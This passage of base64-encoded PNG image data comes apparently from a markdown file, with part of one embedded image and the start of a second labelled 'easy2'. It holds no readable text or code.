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


[easy2]:data:image/png;base64,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